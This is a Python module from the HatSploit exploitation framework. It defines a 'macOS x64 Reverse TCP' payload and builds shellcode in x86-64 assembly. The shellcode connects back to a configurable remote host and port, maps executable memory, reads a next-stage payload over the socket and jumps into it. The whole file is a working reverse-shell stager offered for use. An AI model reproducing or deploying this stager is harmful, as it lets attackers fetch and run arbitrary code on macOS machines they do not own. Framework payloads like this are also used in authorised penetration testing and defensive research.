"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "macOS x64 Reverse TCP",
            'Payload': "macos/x64/reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive reverse TCP connection for macOS "
                "with x64 architecture and reads next phase."
            ),
            'Arch': ARCH_X64,
            'Platform': OS_MACOS,
            'Type': REVERSE_TCP,
        })

        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
                                      False, advanced=True)
        self.length = IntegerOption('PhaseLength', None, "Length of next phase (empty to read length).",
                                    False, advanced=True)

    def run(self):
        assembly = """
        start:
            xor rdi, rdi
            mul rdi
            mov dil, 0x2
            xor rsi, rsi
            mov sil, 0x1
            mov al, 0x2
            ror rax, 0x28
            mov r8, rax
            mov al, 0x61
            syscall
        """

        if self.reliable.value:
            assembly += """
                jb fail
            """

        assembly += f"""
            mov rsi, 0x{self.rhost.little.hex()}{self.rport.little.hex()}020f
            push rsi
            push rsp
            pop rsi
            mov rdi, rax
            xor dl, 0x10
            mov rax, r8
            mov al, 0x62
            syscall
        """

        if self.reliable.value:
            assembly += """
                jb fail
            """

        if not self.length.value:
            assembly += """
                mov rdx, 4
                push 0x0
                lea rsi, [rsp]
                mov rax, 0x2000062
                syscall
            """

        else:
            assembly += f"""
                push {hex(self.length.value)}
            """

        assembly += """
            pop rsi
            push rdi
            xor rdi, rdi
            mov rdx, 7
            mov r10, 0x1002
            xor r8, r8
            xor r9, r9
            mov rax, 0x20000c5
            syscall
        """

        if self.reliable.value:
            assembly += """
                jb fail
            """

        assembly += """
            mov r12, rax
            pop rdi
            mov rsi, r12
            mov rax, 0x200001d
            syscall
        """

        if self.reliable.value:
            assembly += """
                jb fail
            """

        assembly += """
            call r12
        """

        if self.reliable.value:
            assembly += """
            fail:
                mov rax, 0x2000001
                mov rdi, 0x1
                syscall
            """

        return self.assemble(assembly)
